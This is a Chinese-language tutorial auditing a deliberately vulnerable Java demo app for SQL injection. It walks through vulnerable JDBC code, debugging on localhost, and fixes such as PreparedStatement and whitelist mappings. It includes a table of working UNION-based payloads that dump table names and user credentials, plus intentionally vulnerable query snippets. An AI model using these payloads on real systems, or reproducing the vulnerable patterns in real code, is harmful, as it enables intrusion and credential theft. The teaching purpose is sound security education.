# 1-JDBC动态拼接加危险方法造成SQL注入

[TOC]

## （1）前期准备

（1）这次我们审计一个sqlidemo，网上找的，源码就在https://github.com/eytfp/daima，是压缩包sqlidemo.zip

（2）同时要配置的都在下面了，下面这个比较全，只要配置好前五项就可以开始审计了，后面的可以按需配置，版本只能更低，不然漏洞可能消失。但版本也别太低了，不然可能都启动不起来。

| 工具                 | 版本                       | 怎么确认 / 注意啥                            |
| :------------------- | :------------------------- | :------------------------------------------- |
| JDK（也就是 Java 8） | Oracle/OpenJDK 1.8.0_161   | 命令行敲 `java -version`，显示 1.8 就对了    |
| Java 版本            | Java 8                     | 装好 JDK 就自带，不用单独装；别用 Java 11/17 |
| Maven                | apache-maven-3.8.8         | 敲 `mvn -v` 能看到版本号就行                 |
| Maven 镜像           | 阿里云镜像                 | 配一下 `settings.xml`，下依赖快很多          |
| MySQL                | 5.7.26                     | 建个专门给审计用的账号，别用 root            |
| 驱动包               | mysql-connector-java 5.1.x | 跟 MySQL 5.7 配套，别用 8.x                  |
| IDEA                 | 2021 以后都行              | 记得把编码设成 UTF-8                         |
| Git                  | 2.30+                      | 用来看代码改过啥、查出问题的版本             |
| Burp / Fiddler       | 社区版够用                 | 只在自己搭的环境里用，别动别人的站           |
| 反编译工具           | JD-GUI / CFR               | 只有 `.class` 文件没源码时才用               |
| 编码统一             | UTF-8                      | 不然中文注释乱码，看得想哭                   |
| 日志开细一点         | DEBUG                      | 方便看参数怎么流动的，审完记得改回去         |

（3）配置好maven，jdk,MySQL后我们还需要配置数据库

```
create DATABASE sqlidemo

USE `sqlidemo`;
CREATE TABLE IF NOT EXISTS `users`(
   `id` INT UNSIGNED AUTO_INCREMENT,
   `username` VARCHAR(255) NOT NULL,
   `password` VARCHAR(255) NOT NULL,
   PRIMARY KEY (`id`)
)ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO `users` VALUES (1, 'admin', 'admin');
INSERT INTO `users` VALUES (2, 'power7089', 'power7089');
```

## （2）原理

关于原理，sqlidemo用的是Java数据库中的原生繁琐的 JDBC 方式，JDBC----->Java Database Connectivity，是Java 语言中用来规范客户端程序如何来访问数据库的应用程序接口,具体就不说了，可以看看前面的文章



这个之所以产生SQL注入的主要原因是因为直接使用了**动态拼接**这个危险行为，同时搭配**createStatement()**方法造成了SQL注入，`createStatement()`会创建一个 Statement 对象，这个对象遵循的是Statement 的方法。

Statement 的方法本身就不安全，Statement 的做法：将用户输入直接拼进SQL语句，交给数据库。数据库拿到后，将其直接执行。如果用户填的是 admin' OR '1'='1，这个引号就把原来的结构给改了，数据库一看：“哦，这题变成了‘名字是 admin，或者 1=1’”，那 1=1 永远成立，于是把所有用户都查出来了——造成了 SQL 注入。



### 本次关键**①动态拼接参数。②使用createStatement()方法** 。

## （3）探究一下原理

如果配置好了，可以启动，访问下面这两行这是上面我们插入的数据，如果没问题是开始

*http://localhost:7089/sqli/jdbc/dynamic?id=1*       

*http://localhost:7089/sqli/jdbc/dynamic?id=1*

（1）其实就一步，全文搜索createStatement()这个不安全方法，Ctrl+Shift+F

![image-20261125083328956](D:\图片\Saved Pictures - 副本\image-20261125083328956.png)

（2）跳转到src/main/java/com/example/demo/jdbcinjection/JdbcDynamicController.java

![image-20261125083525969](D:\图片\Saved Pictures - 副本\image-20261125083525969.png)

这里是数据库的连接用户名和密码，这里记得改成和自己数据库一样，如果不对去src/main/resources/application.properties这里修改，不然启动不了

![image-20261125083842295](D:\图片\Saved Pictures - 副本\image-20261125083842295.png)

这里就是这次SQL注入的主要原因了，可以说非常简单，为了这盘醋包的这盘饺子。解释一下原因吧，如下

重点如下：

`createStatement()`：创建一个 Statement 对象，定义一个数据库执行语句，然后Statement 直接将前端输入拼接到SQL语句中，之后可使用`executeQuery()`方法执行SQL语句。

`executeQuery(String sql)`方法：执行指定的 SQL 语句，返回单个 ResultSet 对象。



**打个比方——你去饭店点菜：**

- **`createStatement()`：相当于你跟服务员说“给我一张菜单”。服务员递给你一张菜单，这时候纸上有许许多多的菜名，现在还没有任何危险。这个方法只是造了一个能装 SQL 的容器，它自己不执行任何东西。**
- **`executeQuery(String sql)`：相当于你把写好的点菜单递给服务员，服务员照着单子做好菜端给你。这里的“菜”就是 `ResultSet`——数据库查出来的结果集。你递上去的单子写什么，服务员就照着做什么。**
- **其实都没什么问题到这，关键是动态拼接，相当于你拿到菜单然后你自己手动添加了一个菜，服务员也直接将菜名送进后厨，后厨甚至还做出来端给你。**



说穿了方法肯定有一点点问题，菜单要是不能添加菜名那不就没有后续了。



## （4）调试代码和进行SQL注入

这中代码太少，不调试也行，调试看的更清楚

![image-20261125090332164](D:\图片\Saved Pictures - 副本\image-20261125090332164.png)

```
String sql = "select * from users where id = '" + id + "'";
```

这个就比较明显了，可以用字符型注入，则说明单引号闭合前面，不断测试，如果发现报错码是500，说明SQL 结构被你的输入破坏了，这反而说明方向对了

在37行下个断点，访问[localhost:7089/sqli/jdbc/dynamic?id=1](http://localhost:7089/sqli/jdbc/dynamic?id=1)

![image-20261125133410573](D:\图片\Saved Pictures - 副本\image-20261125133410573.png)

访问http://localhost:7089/sqli/jdbc/dynamic?id=1' OR '1'='1

![image-20261125133838199](D:\图片\Saved Pictures - 副本\image-20261125133838199.png)

就这样一个一个测试

全部payload如下：

| 目的       | payload                                                      |
| :--------- | :----------------------------------------------------------- |
| 测注入     | `?id=1' OR '1'='1`                                           |
| 数几列     | `?id=1' order by 3--+`                                       |
| 找回显位   | `?id=1' union select 1,2,3--+`                               |
| 查库名版本 | `?id=-1' union select 1,database(),version()--+`             |
| 查当前用户 | `?id=-1' union select 1,user(),@@version--+`                 |
| 查所有表名 | `?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database()--+` |
| 查表的字段 | `?id=-1' union select 1,column_name,3 from information_schema.columns where table_schema=database() and table_name='users'--+` |
| 拖账号密码 | `?id=-1' union select 1,username,password from users--+`     |

![image-20261125090621147](D:\图片\Saved Pictures - 副本\image-20261125090621147.png)

![image-20261125090646119](D:\图片\Saved Pictures - 副本\image-20261125090646119.png)

后面就不展示了

## （5）修复

1.  Statement 换成 PreparedStatement，SQL 里用 ? 占位，参数用 setXXX() 传
3.  将传入的id类型由string改为int





这里关于2我感觉比较奇妙，居然可以类型转换抵抗注入，但是我感觉还是这个场景特定的修复，因为真实环境不可能之接收一种类型，这不是胡扯吗，下面这个/jdbc/dynamic2和/jdbc/dynamic一模一样，就是将string改为int，改了一下类型

发现已经无法注入，此时报错码是400

**400（Bad Request）**：你发过去的请求本身有毛病——参数格式不对、缺了必填项、JSON 写错了、类型对不上。比如接口要 `id=1` 这种数字，你偏要传 `id=abc`，服务器解析不了，直接回 400。

![image-20261125091438368](D:\图片\Saved Pictures - 副本\image-20261125091438368.png)

![image-20261125091620684](D:\图片\Saved Pictures - 副本\image-20261125091620684.png)







# 2动态拼接加预编译依旧产生SQL注入

## 1对错误预编译开始分析

我们继续分析sqlidemo，不过我们换一段代码分析src/main/java/com/example/demo/jdbcinjection/JdbcPrepareStatement.java

JdbcPrepareStatement.java里面有两个接口，都是预编译，一个安全，一个不安全，先看不安全的接口，我们关注到**/jdbc/preparestaement**这个接口

![image-20261125145932495](D:\图片\Saved Pictures - 副本\image-20261125145932495.png)

这里很直观，关键代码如下，这里的核心问题是：prepareStatement() 只是被调用了，参数化并没有生效。 sql 在传入之前已由 '"+ username +"' 完成拼接，username 作为 SQL 文本的一部分进入预编译语句，而非绑定参数。数据库预编译的是一条结构已被用户输入改写的语句，引号可被闭合、OR/UNION 可被注入，其安全性等价于 Statement.executeQuery(拼接字符串)。

![image-20261125150559632](D:\图片\Saved Pictures - 副本\image-20261125150559632.png)

### 开始调试，在58行下断点

*http://localhost:7089/sqli/jdbc/preparestaement?username=admin*

![image-20261125154538665](D:\图片\Saved Pictures - 副本\image-20261125154538665.png)

发现其还是直接拼接，开始注入*http://localhost:7089/sqli/jdbc/preparestaement?username=admin*' OR '1'='1

观察要执行的sql语句，其逻辑已经被我们修改，说明SQL注入漏洞存在。

![image-20261125161326001](D:\图片\Saved Pictures - 副本\image-20261125161326001.png)

![image-20261125154847556](D:\图片\Saved Pictures - 副本\image-20261125154847556.png)

一共只有两个数据，这是就不再继续了，这个确实挺简单的



## 2对正确预编译进行分析

看src/main/java/com/example/demo/jdbcinjection/JdbcPrepareStatement.java下的**/jdbc/sec**接口

![image-20261125155516948](D:\图片\Saved Pictures - 副本\image-20261125155516948.png)

这段代码之所以安全是因为这里sql 是常量字符串，? 只标记"此处将填入一个值"，不含任何用户数据。预编译在绑定参数之前完成，数据库先确定执行计划；随后 setString(1, username) 通过 JDBC 参数通道单独传值，该值不参与 SQL 文本解析，仅作为标量比较。因此输入中的 '、OR、UNION 等全部被当作普通字符，无法闭合引号或改写语法——' OR '1'='1 只会去匹配一个恰好叫这串文字的用户名，恒真条件不成立。

### 调试，在第三十八行下个断点

http://localhost:7089/sqli/jdbc/sec?username=admin%27%20OR%20%271%27=%271

![image-20261125160927451](D:\图片\Saved Pictures - 副本\image-20261125160927451.png)

这里发现我们的OR也被当成字符串了，sql语句仍然没变，现在这个确实安全了，暂时安全了，普通的注入已经被防住了

与上一例的本质区别：上例 prepareStatement() 收到的是已拼接完成的语句，预编译的是被污染的结构；本例预编译的是干净的模板，外部输入从未进入语句文本。

**总结**

两者用的是同一个 API，差别只在传入 prepareStatement() 的字符串里有没有用户输入。上例中预编译只是一次无意义的包装：编译发生在拼接之后，执行计划已由攻击者控制；下例中编译发生在绑定之前，输入仅作为标量值比较，无法改变 SQL 语法树。

从这里似乎用预编译的话安全性大大提示，但是现实情况没有这么简单，有些情况用不了预编译，如下



# 3无法预编译的情况

**继续看sqlidemo，接上文动态拼接加preparestaement不安全，同时动态拼接加预编译也不安全，预编译加上配套方法还是很安全的，但有些情况不能预编译，这些情况可能会产生新的漏洞。**

## （1）order by

我们来查看src/main/java/com/example/demo/jdbcinjection/JdbcOrderBy.java处的代码

![image-20261126074442314](D:\图片\Saved Pictures - 副本\image-20261126074442314.png)

这里是被迫使用了动态拼接，因为order by是字段名，不能使用预编译，不然数据库会认为其是字符串

1开始调试,在第三十三行处下一个断点,*http://localhost:7089/sqli/jdbc/orderby?id=1*,访问正常情况还行

![image-20261126075041048](D:\图片\Saved Pictures - 副本\image-20261126075041048.png)

*http://localhost:7089/sqli/jdbc/orderby?id=1*' OR '1'='1，逻辑被改变了

![image-20261126075240801](D:\图片\Saved Pictures - 副本\image-20261126075240801.png)

## （2）同时还有几种情况和修复代码如下

情况 1：动态表名

```java
// 危险：分表、多租户、按类型查不同表时很容易这么写
String table = request.getParameter("table");
String sql = "select * from " + table + " where id = ?";
```

```java
// 修复：表名只能来自服务端的常量集合
private static final Set<String> ALLOWED_TABLES =
        new HashSet<String>(Arrays.asList("users", "orders", "logs"));

String table = request.getParameter("table");
if (!ALLOWED_TABLES.contains(table)) {
    throw new IllegalArgumentException("非法表名");
}
String sql = "select * from " + table + " where id = ?";   // table 已是常量，不是用户输入原文
PreparedStatement ps = conn.prepareStatement(sql);
ps.setInt(1, id);                                          // 值仍然参数化
```

情况 3：动态列名（SELECT 列表 / GROUP BY / 查询字段）

```java
// 危险：让用户选"返回哪些字段"
String field = request.getParameter("field");
String sql = "select " + field + " from users where id = ?";
```

```java
// 修复：字段代号 -> 物理列名 的映射
private static final Map<String, String> FIELD_MAP = new HashMap<String, String>();
static {
    FIELD_MAP.put("name", "username");
    FIELD_MAP.put("pwd", "password");
    FIELD_MAP.put("time", "create_time");
}

String column = FIELD_MAP.get(request.getParameter("field"));
if (column == null) throw new IllegalArgumentException("非法字段");
String sql = "select " + column + " from users where id = ?";
```

更省事的做法：**SQL 查固定列，返回到 Java 里再按前端要的字段裁剪**，根本不用动态列名。

情况 4：动态运算符 / 比较符

```java
// 危险：高级查询让用户选 =、>、<、like
String op = request.getParameter("op");
String sql = "select * from users where age " + op + " ?";
```

```java
// 修复：运算符做枚举映射，值照旧绑定
private static final Map<String, String> OP_MAP = new HashMap<String, String>();
static {
    OP_MAP.put("eq", "="); OP_MAP.put("gt", ">"); OP_MAP.put("lt", "<");
    OP_MAP.put("ge", ">="); OP_MAP.put("le", "<=");
}

String op = OP_MAP.get(request.getParameter("op"));
if (op == null) throw new IllegalArgumentException("非法运算符");
String sql = "select * from users where age " + op + " ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setInt(1, age);
```

## （3）修复手段如下

1. 前端传代号，服务端白名单映射
2. 常量集合校验，禁止原文拼接
3. 字段映射，或查全列后在 Java 层裁剪









